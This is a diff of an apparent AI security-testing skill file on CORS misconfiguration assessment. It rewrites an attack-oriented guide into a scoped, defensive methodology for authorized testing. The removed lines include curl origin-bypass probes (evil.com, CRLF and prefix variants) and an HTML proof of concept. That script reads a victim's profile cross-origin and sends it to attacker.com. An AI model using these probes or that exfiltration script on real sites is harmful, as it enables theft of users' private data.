@@ -1,116 +1,94 @@
 ---
 name: attack-cors
-description: "CORS misconfiguration testing — origin reflection, wildcard bypass, null origin, credential leakage"
+description: "Validate CORS policy, credentialed cross-origin reads, origin trust, and browser-enforced impact"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - cors
-  - web
-  - owasp
-  - access-control
-  - attack
-tech_stack:
-  - web
-cwe_ids:
-  - CWE-942
-  - CWE-346
-chains_with:
-  - attack-open-redirect
-  - attack-idor-automation
-prerequisites: []
-severity_boost:
-  attack-open-redirect: "CORS + open redirect = token theft via cross-origin request"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [cors, web, access-control, origin-validation, browser]
+tech_stack: [http, browser, javascript, api]
+cwe_ids: [CWE-942, CWE-346]
+chains_with: [attack-open-redirect, attack-idor-automation, attack-graphql, attack-triage-validation]
+prerequisites:
+  - "Authorized in-scope endpoint and permitted browser testing"
+  - "Controlled test account and a local proof page"
+sources:
+  - "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-cors/SKILL.md"
+  - "https://github.com/uphiago/recon-skills"
+  - "https://portswigger.net/web-security/cors"
+  - "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing"
 ---
 
-# CORS Misconfiguration Attack
+# CORS Misconfiguration Assessment
 
 ## Objective
 
-Identify Cross-Origin Resource Sharing misconfigurations that allow unauthorized cross-origin access to sensitive data or APIs.
+Determine whether the browser's cross-origin policy allows an untrusted origin to read sensitive responses or perform a meaningful authenticated action. Header anomalies alone are leads, not confirmed vulnerabilities.
 
-## Testing Methodology
+## Scope and safety gates
 
-### Phase 1: Origin Reflection Detection
+- Verify the endpoint and application are in scope before sending test requests.
+- Use only a test account and a local page under your control; do not collect another user's data or send proof pages to real users.
+- Never transmit response contents to a third-party collector. Keep proof local and use a harmless marker or synthetic account data.
+- Avoid high-volume origin fuzzing. Test one hypothesis at a time and stop if sensitive data from a real account appears.
+- Confirm the endpoint and test tooling before relying on any CLI helper; the repository's runtime tool registry is the source of truth.
 
-Test if the server reflects arbitrary origins in `Access-Control-Allow-Origin`:
+## Procedure
 
-```bash
-# Automated CORS checker (bundled script)
-attack_script cors_checker https://TARGET/api/endpoint --json-output
-```
+### 1. Establish a baseline
 
-Manual tests:
+Capture the endpoint's normal response and the relevant headers, including `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Vary: Origin`, and any preflight response. Record whether authentication is required and whether the response contains sensitive data.
 
-```bash
-# Arbitrary origin
-curl -s -H "Origin: https://evil.com" TARGET_URL -D- | grep -i "access-control"
+### 2. Test origin trust
 
-# Subdomain bypass
-curl -s -H "Origin: https://TARGET.evil.com" TARGET_URL -D-
+Using a harmless GET/read-only request, compare responses for:
+- a normal legitimate origin;
+- a unique attacker-controlled origin you own;
+- a controlled untrusted subdomain;
+- the `null` origin only where the application legitimately supports opaque-origin contexts;
+- HTTP/HTTPS variants only when relevant to the application.
 
-# Null origin
-curl -s -H "Origin: null" TARGET_URL -D-
+Inspect whether the server reflects an origin, uses an unsafe substring/prefix/suffix check, or allows a broader origin than intended. Do not infer exploitability from reflection alone.
 
-# HTTP downgrade
-curl -s -H "Origin: http://TARGET" TARGET_URL -D-
-```
+### 3. Understand browser rules
 
-### Phase 2: Bypass Techniques
+- `Access-Control-Allow-Origin: *` cannot be used by browsers to expose a credentialed response to JavaScript when credentials are included.
+- `Access-Control-Allow-Credentials: true` by itself proves nothing; the response must also authorize the specific origin and the browser must expose the body.
+- `Vary: Origin` affects caching correctness but its absence is not automatically exploitable; evaluate the actual cache path separately.
+- A preflight response and the actual response have different roles. Verify both when the request is non-simple.
+- CORS does not replace server-side authentication or authorization.
 
-```bash
-# Backtick bypass
-curl -s -H "Origin: https://TARGET%60.evil.com" TARGET_URL -D-
+### 4. Validate in a real browser
 
-# Underscore bypass
-curl -s -H "Origin: https://TARGET_.evil.com" TARGET_URL -D-
+Use a local proof page and a controlled test session. Confirm whether a credentialed cross-origin fetch can read the response body. Keep the body local; demonstrate only a synthetic marker or minimal non-sensitive field. A `curl` response can show headers but cannot prove browser enforcement.
 
-# CRLF injection
-curl -s -H "Origin: https://evil.com%0d%0a" TARGET_URL -D-
+### 5. Test policy edge cases
 
-# Prefix matching bypass
-curl -s -H "Origin: https://evil-TARGET" TARGET_URL -D-
-```
+If the implementation signals these risks, inspect anchored versus unanchored origin matching, unescaped dots in regular expressions, trusted-subdomain assumptions, redirects in the request path, and origin checks in `postMessage` handlers. Do not send CRLF or malformed-origin payloads unless the program explicitly permits that class of testing and the request remains harmless.
 
-### Phase 3: Impact Verification
+### 6. Validate impact and stop
 
-If ACAO reflects attacker origin + ACAC is true:
+Identify what sensitive data is readable or what security boundary is crossed. If the endpoint returns only public data, or the browser refuses to expose the response, downgrade or close the hypothesis. Stop immediately if proof unexpectedly returns real personal data.
 
-```html
-<!-- PoC: reads victim data cross-origin -->
-<script>
-fetch('https://TARGET/api/user/profile', {
-  credentials: 'include'
-})
-.then(r => r.json())
-.then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))))
-</script>
-```
+## Findings and confidence
 
-## What Constitutes a Finding
+A strong finding includes:
+1. the expected origin policy;
+2. the exact request origin and redacted response headers;
+3. the controlled account and authentication context;
+4. a browser-observed readable response;
+5. the minimum synthetic data proving sensitivity;
+6. a clear impact statement and repeatable steps.
 
-| Condition | Severity |
-|-----------|----------|
-| Arbitrary origin reflected + credentials allowed | Critical (P1) |
-| Arbitrary origin reflected, no credentials | Medium (P3) |
-| null origin accepted + credentials allowed | High (P2) |
-| Subdomain origin reflected + credentials | High (P2) |
-| Wildcard ACAO with credentials | Medium (P3) |
+Header reflection alone, `ACAC: true` alone, and wildcard ACAO alone are not enough to claim credentialed CORS data theft. Do not assign a fixed severity from a header pattern; use demonstrated impact and program policy.
 
-## Evidence Requirements
+## Common false positives
 
-- Request with attacker `Origin` header
-- Response showing `Access-Control-Allow-Origin` reflection
-- Response showing `Access-Control-Allow-Credentials: true`
-- PoC HTML demonstrating cross-origin data access
+- Wildcard ACAO without credentialed data exposure.
+- Reflection of an origin that the browser still rejects.
+- Public data incorrectly described as private.
+- Testing only with curl and assuming browser behavior.
+- A CORS issue claimed where the actual weakness is missing authentication or object-level authorization.
 
-## Tools
+## Output contract
 
-- `attack_script cors_checker` — automated multi-origin testing
-- `curl` — manual header injection
-- Browser DevTools — verify CORS behavior
-
-## References
-
-- [PortSwigger: CORS](https://portswigger.net/web-security/cors)
-- [OWASP: CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
+Return: `endpoint`, `origin_tested`, `auth_context`, `acao`, `acac`, `vary_origin`, `preflight_result`, `browser_readable`, `data_sensitivity`, `impact`, `confidence`, and redacted evidence references.
